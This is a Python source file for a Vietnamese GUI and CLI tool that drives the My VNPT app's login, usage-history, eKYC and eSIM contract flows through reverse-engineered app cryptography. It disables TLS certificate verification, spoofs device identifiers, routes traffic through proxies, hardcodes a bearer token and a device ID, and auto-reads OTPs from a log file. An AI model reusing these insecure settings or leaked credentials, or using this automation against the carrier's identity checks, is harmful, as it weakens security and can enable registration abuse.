        update_info_log_hdr, text='Xóa log', bg=CARD, fg=SUB,
        relief='flat', font=('Segoe UI', 8), padx=6,
        command=_clear_update_info_log
    ).pack(side='right', padx=(0, 6))
    update_info_log_area = tk.Text(
        update_info_box, height=7, bg='#181825', fg='#a6e3a1',
        font=('Consolas', 8), relief='flat', state='disabled', wrap='word'
    )
    update_info_log_area.pack(fill='both', expand=True, pady=(2, 0))
    root.after(80, _flush_update_info_log)

    # ===== LỊCH SỬ HOẠT ĐỘNG THUÊ BAO =====
    usage_box = tk.LabelFrame(
        tab_usage_history, text='  LỊCH SỬ HOẠT ĐỘNG MY VNPT  ',
        bg=BG, fg=ACC, relief='groove', bd=1,
        font=('Segoe UI', 10, 'bold'), padx=10, pady=8)
    usage_box.pack(fill='both', expand=True, pady=(2, 5))
    usage_state = {
        'session': None, 'result': None, 'category': 'GPRS_2',
        'busy': False,
    }
    month_options = recent_months()
    month_by_label = {label: (year, month) for label, year, month in month_options}

    def _usage_field(parent, label, width=24, show=None):
        row = tk.Frame(parent, bg=BG)
        row.pack(fill='x', pady=2)
        mklbl(row, label, bold=True, width=17, size=9).pack(side='left')
        entry = mkentry(row, width=width, show=show)
        entry.pack(side='left', padx=(5, 4), ipady=3)
        return row, entry

    _row, usage_phone_entry = _usage_field(usage_box, 'Số thuê bao:')
    password_row, usage_password_entry = _usage_field(
        usage_box, 'Mật khẩu My VNPT:', show='*')
    history_otp_row, usage_history_otp_entry = _usage_field(
        usage_box, 'OTP lịch sử:', width=14)
    usage_status = mklbl(
        usage_box, 'Nhập số điện thoại và mật khẩu My VNPT để đăng nhập.',
        fg=SUB, size=9, wraplength=680)

    def _usage_set_status(message, color=SUB):
        root.after(0, lambda text=str(message), fg=color:
                   usage_status.config(text=text, fg=fg))

    def _usage_busy(value):
        usage_state['busy'] = value
        root.after(0, lambda: usage_lookup_button.config(
            state='disabled' if value else 'normal'))

    def _usage_phone():
        phone = _esim_normalize_msisdn(usage_phone_entry.get())
        if not re.fullmatch(r'84\d{9}', phone):
            raise UsageHistoryError('Nhập số thuê bao hợp lệ (0xxxxxxxxx).')
        return phone

    def _usage_login():
        if usage_state['busy']:
            return
        try:
            phone = _usage_phone()
        except UsageHistoryError as exc:
            _usage_set_status(exc, ERR)
            return
        password = usage_password_entry.get()
        if not password:
            _usage_set_status('Nhập mật khẩu My VNPT.', ERR)
            return
        usage_state['session'] = None
        usage_state['result'] = None
        _usage_render()
        _usage_set_otp_visible(False)
        _usage_busy(True)
        _usage_set_status('Đang đăng nhập My VNPT...', YEL)
        def worker():
            try:
                session = login_myvnpt_session(
                    phone, password=password,
                    session_file=USAGE_HISTORY_SESSION_JSON,
                    mirror_default=False, inherit_default=False,
                    log_cb=lambda _message: None)
                if _esim_normalize_msisdn(
                        session.get('API_MSISDN_LOGIN') or
                        session.get('phone_number_login')) != phone:
                    raise UsageHistoryError('Phiên đăng nhập không khớp số thuê bao.')

                def finish():
                    if _esim_normalize_msisdn(usage_phone_entry.get()) != phone:
                        _usage_set_status(
                            'Số thuê bao đã đổi. Hãy đăng nhập số mới.', SUB)
                        return
                    usage_state['session'] = session
                    usage_password_entry.delete(0, 'end')
                    usage_history_otp_entry.delete(0, 'end')
                    _usage_set_otp_visible(False)
                    _usage_set_status('Đăng nhập thành công. Chọn tháng và bấm Tra cứu.', OK)

                root.after(0, finish)
            except Exception as exc:
                _usage_set_status(exc, ERR)
            finally:
                _usage_busy(False)

        threading.Thread(target=worker, name='usage-login', daemon=True).start()

    mkbtn(password_row, 'Đăng nhập', _usage_login,
          bg=ACC, fg=BTN_FG, size=8).pack(side='left', padx=(4, 0))

    def _usage_send_history_otp():
        session = usage_state['session']
        if not session:
            _usage_set_status('Hãy đăng nhập My VNPT trước.', ERR)
            return
        if usage_state['busy']:
            return
        _usage_busy(True)
        _usage_set_status('Đang gửi OTP xem lịch sử...', YEL)

        def worker():
            try:
                send_myvnpt_usage_history_otp(session)
                _usage_set_status('OTP lịch sử đã gửi. Nhập mã rồi bấm Tra cứu.', OK)
            except Exception as exc:
                _usage_set_status(exc, ERR)
            finally:
                _usage_busy(False)

        threading.Thread(target=worker, name='usage-history-otp', daemon=True).start()

    mkbtn(history_otp_row, 'Gửi OTP lịch sử', _usage_send_history_otp,
          bg=CARD, fg=FG, size=8).pack(side='left', padx=(4, 0))
    usage_otp_note = mklbl(
        usage_box, 'OTP lịch sử chỉ cần khi My VNPT yêu cầu xác minh thêm.',
        fg=SUB, size=8)
    usage_otp_note.pack(anchor='w', pady=(1, 5))
    history_otp_row.pack_forget()
    usage_otp_note.pack_forget()

    lookup_row = tk.Frame(usage_box, bg=BG)
    lookup_row.pack(fill='x', pady=(2, 7))

    def _usage_set_otp_visible(visible):
        if visible:
            history_otp_row.pack(fill='x', pady=2, before=lookup_row)
            usage_otp_note.pack(anchor='w', pady=(1, 5), before=lookup_row)
        else:
            history_otp_row.pack_forget()
            usage_otp_note.pack_forget()
            usage_history_otp_entry.delete(0, 'end')
    mklbl(lookup_row, 'Tháng:', bold=True, width=17, size=9).pack(side='left')
    usage_month_var = tk.StringVar(value=month_options[0][0])
    usage_month_box = ttk.Combobox(
        lookup_row, textvariable=usage_month_var,
        values=[item[0] for item in month_options],
        state='readonly', width=17)
    usage_month_box.pack(side='left', padx=(5, 8))

    def _usage_lookup():
        if usage_state['busy']:
            return
        session = usage_state['session']
        if not session:
            _usage_set_status('Hãy đăng nhập My VNPT trước.', ERR)
            return
        try:
            if _usage_phone() != _esim_normalize_msisdn(
                    session.get('API_MSISDN_LOGIN') or
                    session.get('phone_number_login')):
                raise UsageHistoryError(
                    'Số thuê bao đã thay đổi. Hãy đăng nhập lại số này.')
        except UsageHistoryError as exc:
            _usage_set_status(exc, ERR)
            return
        period = month_by_label.get(usage_month_var.get())
        if not period:
            _usage_set_status('Chọn một tháng hợp lệ.', ERR)
            return
        otp = usage_history_otp_entry.get().strip()
        usage_state['result'] = None
        _usage_render()
        _usage_busy(True)
        _usage_set_status(f'Đang tra cứu {usage_month_var.get()}...', YEL)

        def worker():
            try:
                result = fetch_myvnpt_usage_history(
                    session, period[0], period[1], otp=otp)

                def finish():
                    if (usage_state['session'] is not session or
                            month_by_label.get(usage_month_var.get()) != period):
                        return
                    usage_state['result'] = result
                    usage_history_otp_entry.delete(0, 'end')
                    _usage_set_otp_visible(False)
                    _usage_render()
                    _usage_set_status('Đã tải lịch sử hoạt động.', OK)

                root.after(0, finish)
            except HistoryOtpRequired as exc:
                if usage_state['session'] is not session:
                    return
                root.after(0, lambda: _usage_set_otp_visible(True))
                _usage_set_status(
                    f'My VNPT trả mã 1: {exc}. Có thể thử lại hoặc dùng OTP lịch sử.',
                    YEL)
            except Exception as exc:
                _usage_set_status(exc, ERR)
            finally:
                _usage_busy(False)

        threading.Thread(target=worker, name='usage-lookup', daemon=True).start()

    usage_lookup_button = mkbtn(
        lookup_row, 'TRA CỨU', _usage_lookup, bg=ACC, fg=BTN_FG, size=9)
    usage_lookup_button.pack(side='left')
    usage_status.pack(fill='x', pady=(0, 7))

    category_row = tk.Frame(usage_box, bg=BG)
    category_row.pack(fill='x', pady=(0, 7))
    category_buttons = {}

    def _usage_select_category(category):
        usage_state['category'] = category
        for key, button in category_buttons.items():
            button.config(bg=ACC if key == category else CARD,
                          fg=BTN_FG if key == category else FG)
        _usage_render()

    for category_key, title in USAGE_HISTORY_CATEGORIES:
        button = mkbtn(
            category_row, title,
            lambda key=category_key: _usage_select_category(key),
            bg=ACC if category_key == 'GPRS_2' else CARD,
            fg=BTN_FG if category_key == 'GPRS_2' else FG, size=9)
        button.pack(side='left', padx=(0, 5))
        category_buttons[category_key] = button

    usage_summary = mklbl(usage_box, 'Chưa có dữ liệu',
                          bold=True, fg=FG, size=11)
    usage_summary.pack(anchor='w', pady=(0, 2))
    usage_charge = mklbl(usage_box, '', fg=SUB, size=9)
    usage_charge.pack(anchor='w', pady=(0, 4))
    usage_chart = tk.Canvas(
        usage_box, height=160, bg=CARD, highlightthickness=0)
    usage_chart.pack(fill='x', pady=(0, 7))

    def _usage_draw_chart(_event=None):
        usage_chart.delete('all')
        result = usage_state['result']
        width = max(300, usage_chart.winfo_width())
        height = max(120, usage_chart.winfo_height())
        left, right, top, bottom = 36, width - 12, 12, height - 25
        for fraction in (0, .25, .5, .75, 1):
            y = bottom - fraction * (bottom - top)
            usage_chart.create_line(left, y, right, y, fill='#45475a')
        if result is None:
            usage_chart.create_text(width / 2, height / 2,
                                    text='Chưa tra cứu', fill=SUB,
                                    font=('Segoe UI', 9))
            return
        period = month_by_label.get(usage_month_var.get())
        if not period:
            return
        daily = category_view(
            result, usage_state['category'], period[0], period[1])['daily']
        peak = max(daily, default=0)
        if peak <= 0:
            usage_chart.create_text(width / 2, height / 2,
                                    text='Không có hoạt động trong tháng',
                                    fill=SUB, font=('Segoe UI', 9))
        else:
            step = (right - left) / len(daily)
            for day_index, value in enumerate(daily):
                if value <= 0:
                    continue
                x1 = left + day_index * step + 1
                x2 = left + (day_index + 1) * step - 1
                y = bottom - value / peak * (bottom - top)
                usage_chart.create_rectangle(
                    x1, y, max(x1 + 1, x2), bottom,
                    fill=ACC, outline='')
        for day in sorted({1, 5, 10, 15, 20, 25, len(daily)}):
            if day <= len(daily):
                x = left + (day - .5) * (right - left) / len(daily)
                usage_chart.create_text(
                    x, height - 12, text=str(day), fill=SUB,
                    font=('Segoe UI', 8))

    usage_chart.bind('<Configure>', _usage_draw_chart)

    detail_frame = tk.Frame(usage_box, bg=BG)
    detail_frame.pack(fill='both', expand=True)
    usage_tree = ttk.Treeview(
        detail_frame, columns=('date', 'detail', 'usage', 'charge'),
        show='headings', height=8)
    for key, title, width in (
            ('date', 'Thời gian', 150), ('detail', 'Chi tiết', 230),
            ('usage', 'Sử dụng', 145), ('charge', 'Cước', 100)):
        usage_tree.heading(key, text=title)
        usage_tree.column(key, width=width, minwidth=80,
                          anchor='e' if key == 'charge' else 'w')
    usage_scroll = ttk.Scrollbar(
        detail_frame, orient='vertical', command=usage_tree.yview)
    usage_tree.configure(yscrollcommand=usage_scroll.set)
    usage_tree.pack(side='left', fill='both', expand=True)
    usage_scroll.pack(side='right', fill='y')

    def _usage_render():
        for item in usage_tree.get_children():
            usage_tree.delete(item)
        result = usage_state['result']
        period = month_by_label.get(usage_month_var.get())
        if result is None or not period:
            usage_summary.config(text='Chưa có dữ liệu')
            usage_charge.config(text='')
            _usage_draw_chart()
            return
        view = category_view(
            result, usage_state['category'], period[0], period[1])
        change = view['change']
        change_text = ''
        if change not in (None, ''):
            try:
                change_text = f'  ({float(change):+.0f}% so với tháng trước)'
            except (ValueError, TypeError):
                pass
        usage_summary.config(
            text=f'{view["label"]}: {view["main"]}{change_text}')
        usage_charge.config(
            text=(f'{view["charge_label"]}: {view["charge"]}'
                  if view['charge_label'] else ''))
        for row in view['rows']:
            usage_tree.insert(
                '', 'end', values=display_row(row, usage_state['category']))
        _usage_draw_chart()

    def _usage_month_changed(_event=None):
        usage_state['result'] = None
        _usage_render()
        _usage_set_status('Đã đổi tháng. Bấm Tra cứu để tải dữ liệu mới.', SUB)

    def _usage_phone_changed(_event=None):
        session = usage_state['session']
        if session and _esim_normalize_msisdn(
                usage_phone_entry.get()) != _esim_normalize_msisdn(
                    session.get('API_MSISDN_LOGIN') or
                    session.get('phone_number_login')):
            usage_state['session'] = None
            usage_state['result'] = None
            _usage_set_otp_visible(False)
            _usage_render()
            _usage_set_status('Số thuê bao đã đổi. Hãy đăng nhập lại.', SUB)

    usage_month_box.bind('<<ComboboxSelected>>', _usage_month_changed)
    usage_phone_entry.bind('<KeyRelease>', _usage_phone_changed)

    # ===== INITIAL STATE =====
    # Vao thang dashboard neu co token, khong check het han
    if ONEBSS_TOKEN.strip():
        _ONEBSS_SESSION['token'] = ONEBSS_TOKEN
        hdr_status.config(text="  \u2705 Token da tai", fg=OK)
        show_frame('dashboard')
    else:
        show_frame('login')

    # Center
    root.update_idletasks()
    sw, sh = root.winfo_screenwidth(), root.winfo_screenheight()
    # Keep enough room for the dashboard tabs; the window remains resizable.
    w, h = 820, 760
    root.geometry(f"{w}x{h}+{(sw-w)//2}+{(sh-h)//2}")
    root.lift()
    root.attributes('-topmost', True)
    root.after(500, lambda: root.attributes('-topmost', False))

    # Thoat hoan toan khi nhan X (khong chay tiep ekyc trong terminal)
    _gui_state = {'closed_by_user': True}

    def on_close():
        if _shutdown_event.is_set():
            return
        _gui_state['closed_by_user'] = True
        _shutdown_event.set()
        _batch_stop_event.set()

        executor = _batch_executor.get('value')
        if executor is not None:
            try:
                executor.shutdown(wait=False, cancel_futures=True)
            except Exception:
                pass
        _terminate_active_children()

        try:
            root.destroy()
        finally:
            try:
                shutil.rmtree(SESSION_TEMP_DIR, ignore_errors=True)
            finally:
                # sys.exit() only exits the Tk main thread. os._exit() is
                # intentional here: it also stops active network workers.
                os._exit(0)

    root.protocol("WM_DELETE_WINDOW", on_close)

    root.mainloop()

    # Neu mainloop ket thuc ma khong phai tu on_close  user dang chay DKTTTB qua subprocess
    # Khong can chay gi them - ekyc da duoc chay tu _run_ekyc_thread()
    sys.exit(0)


# Globals - populated from device_session.json
BEARER_TOKEN  = ""
DEVICE_INFO   = ""
MAC_ADDRESS   = ""
CLIENT_SESSION = ""





# ===========================================================================
# CRYPTO HELPERS
# ===========================================================================
def aes_decrypt(b64_data, key=None):
    try:
        if key is None:
            key = AES_MASTER_KEY
        raw = base64.b64decode(b64_data)
        print(f"  [DEBUG-AES] B64 Length: {len(b64_data)}, Raw Length: {len(raw)}, Modulo 16: {len(raw) % 16}")
        if len(raw) % 16 != 0:
            print(f"  [DEBUG-AES] Invalid data: {b64_data[:50]}...{b64_data[-50:]}")
        cipher = AES.new(key.encode("utf-8"), AES.MODE_CBC, IV_ZEROS)
        return unpad(cipher.decrypt(raw), AES.block_size).decode("utf-8")
    except Exception as e:
        print(f"  [DEBUG-AES] Decrypt error: {e}")
        raise

def aes_encrypt(plaintext, key):
    """AES/CBC/PKCS7 encrypt (encryptAESGenerator)"""
    cipher = AES.new(key.encode("utf-8"), AES.MODE_CBC, IV_ZEROS)
    return base64.b64encode(
        cipher.encrypt(pad(plaintext.encode("utf-8"), AES.block_size))
    ).decode("utf-8")

def aes_decrypt_gen(b64_data, key):
    """AES/CBC/PKCS7 decrypt (decryptAESGenerator)"""
    raw = base64.b64decode(b64_data)
    cipher = AES.new(key.encode("utf-8"), AES.MODE_CBC, IV_ZEROS)
    return unpad(cipher.decrypt(raw), AES.block_size).decode("utf-8")

def sign_sha256_rsa(data_str, priv_key_b64):
    """signWithRSA - SHA256withRSA PKCS1v15"""
    key = RSA.import_key(base64.b64decode(priv_key_b64))
    h = SHA256.new(data_str.encode("utf-8"))
    return base64.b64encode(pkcs1_15.new(key).sign(h)).decode("utf-8")

def rsa_encrypt_no_padding(plaintext, pub_key_b64):
    """RSAEncrypt - RSA/ECB/NoPadding (raw modular exponentiation, matching app's encrypt() method).
    Pads plaintext to modulus length with zero bytes on the LEFT."""
    key = RSA.import_key(base64.b64decode(pub_key_b64))
    n = key.n
    e = key.e
    key_size = (n.bit_length() + 7) // 8  # bytes in modulus
    pt_bytes = plaintext.encode("utf-8")
    # Zero-pad to key_size (NoPadding: Java left-pads with zeros)
    if len(pt_bytes) > key_size:
        raise ValueError(f"Plaintext ({len(pt_bytes)} bytes) too long for key ({key_size} bytes)")
    pt_padded = b'\x00' * (key_size - len(pt_bytes)) + pt_bytes
    m = int.from_bytes(pt_padded, 'big')
    c = pow(m, e, n)
    ct_bytes = c.to_bytes(key_size, 'big')
    return base64.b64encode(ct_bytes).decode("utf-8").replace("\n","").replace("\r","")

class DhAdapter(HTTPAdapter):
    def init_poolmanager(self, *args, **kwargs):
        ctx = create_urllib3_context()
        ctx.set_ciphers("DEFAULT:@SECLEVEL=1")
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        kwargs["ssl_context"] = ctx
        return super().init_poolmanager(*args, **kwargs)

myvnpt_sess = requests.Session()
myvnpt_sess.mount("https://", DhAdapter())




def _main_cli():
    global BEARER_TOKEN, DEVICE_INFO, MAC_ADDRESS, AES_MASTER_KEY, CLIENT_SESSION, SESSION_ID, MSISDN
    import ctypes, os, sys
    if proxy_manager.is_enabled():
        try:
            _cli_proxies = proxy_manager.current_requests_proxies(refresh_if_missing=True)
            if _cli_proxies:
                os.environ["HTTP_PROXY"] = _cli_proxies["http"]
                os.environ["HTTPS_PROXY"] = _cli_proxies["https"]
                print("[PROXY] Đã áp dụng proxy cho tiến trình eKYC")
        except Exception as _proxy_exc:
            print(f"[PROXY] Lỗi cấu hình proxy: {_proxy_exc}")
            if proxy_manager.is_required() and '--no-gui' in sys.argv:
                sys.exit(2)
    if os.name == 'nt' and '--no-gui' not in sys.argv and '--phone' not in sys.argv:
        try:
            ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
        except:
            pass

    # ===========================================================================
    # STEP 1: Load config from device_session.json (created by auto_run GUI)
    # ===========================================================================
    SEP = "=" * 70
    print(SEP)
    print("  eKYC Full Flow - My VNPT")
    print(SEP)

    # Check CLI args for direct phone/pass login without GUI
    _cli_phone = next((sys.argv[i+1] for i,a in enumerate(sys.argv) if a in ('--phone', '--msisdn-login') and i+1<len(sys.argv)), None)
    _cli_pass  = next((sys.argv[i+1] for i,a in enumerate(sys.argv) if a in ('--pass', '--password') and i+1<len(sys.argv)), None)
    if (_cli_phone and (_cli_pass is not None) and '--no-gui' in sys.argv and
            '--esim' not in sys.argv and '--esim-change' not in sys.argv and
            '--esim-continue' not in sys.argv):
        print(f"[CLI] Chay tu dong eKYC cho ST={_cli_phone} qua CLI...")
        ok, fname, msisdn_res, err_res = run_ekyc_auto(_cli_phone, _cli_pass, log_cb=print)
        try:
            result_txt = _append_txt_result(
                _cli_phone, ok, error_reason=err_res
            )
            print(f"[FILE] Da ghi ket qua: {result_txt}")
        except Exception as result_exc:
            print(f"[FILE] Loi ghi ket qua txt: {result_exc}")
        sys.exit(0 if ok else 1)

    # eContract OTP can be resumed independently after the eSIM eKYC/contract
    # step.  This keeps the six-digit code out of config files and preserves
    # the existing --esim/--esim-change registration commands.
    if '--esim-contract-otp-send' in sys.argv or '--esim-contract-otp-verify' in sys.argv:
        _otp_result_file = next((sys.argv[i + 1] for i, arg in enumerate(sys.argv)
                                 if arg in ('--result-file', '--esim-result-file') and i + 1 < len(sys.argv)), None)
        _otp_session_file = next((sys.argv[i + 1] for i, arg in enumerate(sys.argv)
                                  if arg in ('--session-file', '--esim-session-file') and i + 1 < len(sys.argv)), None)
        if not _otp_result_file:
            _otp_phone = next((sys.argv[i + 1] for i, arg in enumerate(sys.argv)
                               if arg in ('--phone', '--msisdn-login') and i + 1 < len(sys.argv)), None)
            if _otp_phone:
                _otp_result_file = os.path.join(HISTORY_DIR, f'esim_result_{re.sub(r"\D", "", _otp_phone)}.json')
        if not _otp_result_file:
            _otp_result_file = os.path.join(HISTORY_DIR, 'esim_result.json')
        try:
            if '--esim-contract-otp-send' in sys.argv:
                _otp_result = run_esim_contract_send_otp(
                    {'result_file': _otp_result_file}, session_file=_otp_session_file, log_cb=print)
                # --auto-otp: tu dong doc OTP tu system_log.txt va verify ngay
                if '--auto-otp' in sys.argv:
                    _log_file = next((sys.argv[i + 1] for i, arg in enumerate(sys.argv)
                                      if arg == '--log-file' and i + 1 < len(sys.argv)), None)
                    if not _log_file:
                        _log_file = os.environ.get('TOOLGSM_SYSTEM_LOG', '')
                    import time as _time, re as _re, os as _os
                    print(f'[AUTO-OTP] Dang theo doi {_log_file} cho OTP tu eContract...')
                    _sent_at = _time.time()
                    _otp_found = None
                    # Ghi nho vi tri file truoc khi gui OTP de chi doc dong MOI
                    try:
                        _start_pos = _os.path.getsize(_log_file)
                    except Exception:
                        _start_pos = 0
                    for _wait in range(120):  # cho toi da 120 giay
                        _time.sleep(1)
                        try:
                            with open(_log_file, encoding='utf-8', errors='replace') as _lf:
                                _lf.seek(_start_pos)
                                for _line in _lf:
                                    # Chi xu ly dong chua "eContract" va "OTP"
                                    if 'eContract' not in _line:
                                        continue
                                    # Lay 6 chu so sau "OTP"
                                    _m = _re.search(r'OTP[^0-9]{0,10}(\d{6})', _line)
                                    if _m:
                                        _otp_found = _m.group(1)
                        except Exception:
                            pass
                        if _otp_found:
                            print(f'[AUTO-OTP] Tim thay OTP: {_otp_found} - verify ngay!')
                            _otp_result = run_esim_contract_verify_otp(
                                {'result_file': _otp_result_file}, _otp_found,
                                session_file=_otp_session_file, log_cb=print)
                            break
                    else:
                        print('[AUTO-OTP] Timeout: khong nhan duoc OTP trong 120s')
            else:
                _otp_value = next((sys.argv[i + 1] for i, arg in enumerate(sys.argv)
                                   if arg in ('--otp', '--contract-otp') and i + 1 < len(sys.argv)), None)
                _otp_value = _otp_value or input('OTP ky hop dong (6 so): ').strip()
                _otp_result = run_esim_contract_verify_otp(
                    {'result_file': _otp_result_file}, _otp_value,
                    session_file=_otp_session_file, log_cb=print)
            print(json.dumps(_otp_result, ensure_ascii=False, indent=2))
            sys.exit(0 if _otp_result.get('ok') else 2)
        except Exception as _otp_exc:
            print(f'[ESIM OTP] FAILED: {_otp_exc}')
            sys.exit(2)

    # Submit the handwritten signature after OTP verification.  The APK uses
    # this v2/sign call before provisioning can create a serial/QR.
    if '--esim-contract-sign' in sys.argv:
        _sign_result_file = next((sys.argv[i + 1] for i, arg in enumerate(sys.argv)
                                  if arg in ('--result-file', '--esim-result-file') and i + 1 < len(sys.argv)), None)
        _sign_session_file = next((sys.argv[i + 1] for i, arg in enumerate(sys.argv)
                                   if arg in ('--session-file', '--esim-session-file') and i + 1 < len(sys.argv)), None)
        _signature_file = next((sys.argv[i + 1] for i, arg in enumerate(sys.argv)
                                if arg in ('--signature-file', '--sign-img1') and i + 1 < len(sys.argv)), None)
        if not _sign_result_file:
            _sign_phone = next((sys.argv[i + 1] for i, arg in enumerate(sys.argv)
                                if arg in ('--phone', '--msisdn-login') and i + 1 < len(sys.argv)), None)
            if _sign_phone:
                _sign_result_file = os.path.join(HISTORY_DIR, f'esim_result_{re.sub(r"\D", "", _sign_phone)}.json')
        if not _sign_result_file:
            _sign_result_file = os.path.join(HISTORY_DIR, 'esim_result.json')
        if not _signature_file:
            print('[ESIM SIGN] Thieu --signature-file <anh_chu_ky.png>')
            sys.exit(2)
        try:
            _signed = run_esim_contract_submit_signature(
                {'result_file': _sign_result_file}, _signature_file,
                session_file=_sign_session_file, log_cb=print)
            print(json.dumps(_signed, ensure_ascii=False, indent=2))
            sys.exit(0 if _signed.get('signature_submitted') else 2)
        except Exception as _sign_exc:
            print(f'[ESIM SIGN] FAILED: {_sign_exc}')
            sys.exit(2)

    # Fetch the QR after the eContract has already been signed.  This is a
    # read-only provisioning/polling step and must not recreate the request or
    # send another signing OTP.
    if '--esim-fetch-qr' in sys.argv:
        _qr_result_file = next((sys.argv[i + 1] for i, arg in enumerate(sys.argv)
                                if arg in ('--result-file', '--esim-result-file') and i + 1 < len(sys.argv)), None)
        _qr_session_file = next((sys.argv[i + 1] for i, arg in enumerate(sys.argv)
                                 if arg in ('--session-file', '--esim-session-file') and i + 1 < len(sys.argv)), None)
        if not _qr_result_file:
            _qr_phone = next((sys.argv[i + 1] for i, arg in enumerate(sys.argv)
                              if arg in ('--phone', '--msisdn-login') and i + 1 < len(sys.argv)), None)
            if _qr_phone:
                _qr_result_file = os.path.join(HISTORY_DIR, f'esim_result_{re.sub(r"\D", "", _qr_phone)}.json')
        if not _qr_result_file:
            _qr_result_file = os.path.join(HISTORY_DIR, 'esim_result.json')
        try:
            _qr_result = run_esim_postsign_qr(
                {'result_file': _qr_result_file},
                session_file=_qr_session_file, log_cb=print,
                retries=6, wait_seconds=10)
            print(json.dumps(_qr_result, ensure_ascii=False, indent=2))
            sys.exit(0 if _qr_result.get('qr') else 2)
        except Exception as _qr_exc:
            print(f'[ESIM QR] FAILED: {_qr_exc}')
            sys.exit(2)


    # Independent eSIM mode. DKTTTB remains the default mode when --esim is
    # absent; eSIM uses a JSON config so order and contract choices are explicit.
    if '--esim' in sys.argv or '--esim-change' in sys.argv or '--esim-continue' in sys.argv:
        _cli_esim_config = next((sys.argv[i + 1] for i, arg in enumerate(sys.argv)
                                 if arg in ('--esim-config', '--config') and i + 1 < len(sys.argv)), None)
        _cli_esim_session = next((sys.argv[i + 1] for i, arg in enumerate(sys.argv)
                                  if arg in ('--esim-session-file', '--session-file') and i + 1 < len(sys.argv)), None)
        if not _cli_esim_config and ('--esim-change' in sys.argv or '--esim-continue' in sys.argv):
            # The phone UI has exactly these two customer inputs.  All other
            # values are loaded from device_session.json/esim_context.json.
            _cli_backup = next((sys.argv[i + 1] for i, arg in enumerate(sys.argv)
                                if arg in ('--backup-phone', '--backup-phone-number') and i + 1 < len(sys.argv)), None)
            _cli_email = next((sys.argv[i + 1] for i, arg in enumerate(sys.argv)
                               if arg == '--email' and i + 1 < len(sys.argv)), None)
            _cli_login_phone = next((sys.argv[i + 1] for i, arg in enumerate(sys.argv)
                                     if arg in ('--login-phone', '--msisdn-login', '--phone') and i + 1 < len(sys.argv)), None)
            _cli_login_password = next((sys.argv[i + 1] for i, arg in enumerate(sys.argv)
                                        if arg in ('--login-password', '--password', '--pass') and i + 1 < len(sys.argv)), None)
            _cli_backup = _cli_backup or input('Số điện thoại dự phòng: ').strip()
            _cli_email = _cli_email or input('Email: ').strip()
            if not _cli_login_phone:
                _cli_login_phone = input('Số thuê bao My VNPT đăng nhập: ').strip()
            if not _cli_login_password:
                import getpass as _getpass
                _cli_login_password = _getpass.getpass('Mật khẩu My VNPT: ')
            _cli_esim_config = {
                'mode': 'change',
                'backup_phone_number': _cli_backup,
                'email': _cli_email,
                'login_msisdn': _cli_login_phone,
                'login_password': _cli_login_password,
            }
            if '--esim-continue' in sys.argv:
                _cli_digits = re.sub(r'\D', '', _cli_login_phone or '')
                _cli_artifact = next((sys.argv[i + 1] for i, arg in enumerate(sys.argv)
                                      if arg in ('--ekyc-artifacts', '--ekyc-result-file') and i + 1 < len(sys.argv)), None)
                _cli_esim_config.update({
                    'continue_ekyc': True,
                    'contact_phone': _cli_backup,
                    'ekyc_result_file': _cli_artifact or os.path.join(HISTORY_DIR, f'esim_artifacts_{_cli_digits}.json'),
                    'result_file': os.path.join(HISTORY_DIR, f'esim_result_{_cli_digits}.json'),
                })
        if not _cli_esim_config:
            print('[ESIM] Usage: python ekyc_full.py --esim --esim-config esim_config.json')
            print('[ESIM] Hoặc: python ekyc_full.py --esim-change --backup-phone 09... --email a@b.com')
            sys.exit(2)
        try:
            _esim_result = run_esim_registration(_cli_esim_config, session_file=_cli_esim_session, log_cb=print)
            print(json.dumps(_esim_result, ensure_ascii=False, indent=2))
            sys.exit(0 if _esim_result.get('ok') else 2)
        except Exception as _esim_exc:
            print(f'[ESIM] FAILED: {_esim_exc}')
            sys.exit(2)

    # Hien thi GUI de cap nhat ONEBSS token
    show_onebss_config_gui()

    # ===== STEP 1: Load session from device_session.json (hoac file rieng neu --session-file) =====
    print("\n[STEP 1] Load session tu device_session.json...")
    # Neu co --session-file (da luong), dung file rieng cua luong nay
    _cli_session_file = next((sys.argv[i+1] for i,a in enumerate(sys.argv) if a=='--session-file' and i+1<len(sys.argv)), None)
    if _cli_session_file and os.path.exists(_cli_session_file):
        print(f"  [STEP 1] --skip-device: Load session tu {os.path.basename(_cli_session_file)}...")
        try:
            with open(_cli_session_file, 'r', encoding='utf-8') as _f:
                _sess = json.load(_f)
        except Exception as _e:
            print(f"  WARN: Khong doc duoc {_cli_session_file}: {_e}")
            _sess = _load_session_data() or {}
    else:
        _sess = _load_session_data()
    if not _sess:
        print("  WARN: Chua co device_session.json! Hay chay GUI va nhan 'CHAY DKTTTB' de tao.")
        _sess = {}
    # Apply vao globals
    if _sess.get('BEARER_TOKEN') or _sess.get('Authorization'):
        BEARER_TOKEN = _sess.get('BEARER_TOKEN') or _sess.get('Authorization','')
    elif not BEARER_TOKEN:
        BEARER_TOKEN = "Bearer a60bd62fed0cf1076e93af76114f196bd9c5a48155b2bac88afe15c49595414b"
    if _sess.get('DEVICE_INFO') or _sess.get('Device-Info'):
        DEVICE_INFO = _sess.get('DEVICE_INFO') or _sess.get('Device-Info','')
    elif not DEVICE_INFO:
        DEVICE_INFO = "805a029d-e89a-4bd5-a7f5-49f0747f2267|805a029d-e89a-4bd5-a7f5-49f0747f2267|unknown|Android||3.3.99.Prd|V2057|11|"
    if _sess.get('MAC_ADDRESS') or _sess.get('mac-address'):
        MAC_ADDRESS = _sess.get('MAC_ADDRESS') or _sess.get('mac-address','')
    elif not MAC_ADDRESS:
        MAC_ADDRESS = "a9494f35748322ab"
    if _sess.get('KEY_ENCRYPT_AES'):
        AES_MASTER_KEY = _sess['KEY_ENCRYPT_AES']
    import time as _t
    ts = int(_t.time() * 1000)
    model = DEVICE_INFO.split('|')[6] if DEVICE_INFO and len(DEVICE_INFO.split('|')) >= 7 else 'V2057'
    CLIENT_SESSION = f"ANDROID_{model}_32_Device_3.6.6_{MAC_ADDRESS}_{ts}_com.vnp.myvinaphone"
    print(f"  Da load session luu luc: {_sess.get('_saved_at','?')}")
    collected = _sess


    # Extract SharedPrefs-based values from collected dict
    encrypted_priv  = collected.get("rsa_key_private", "")
    server_pub_enc  = collected.get("server_public_key", "")
    SESSION_ID      = (collected.get("login_session") or
                       collected.get("API_SESSION_ID") or "")
    MSISDN          = collected.get("phone_number_login") or "84855998879"

    print(f"\n[STEP 1] Config assembled:")
    print(f"  MSISDN:  {MSISDN}")
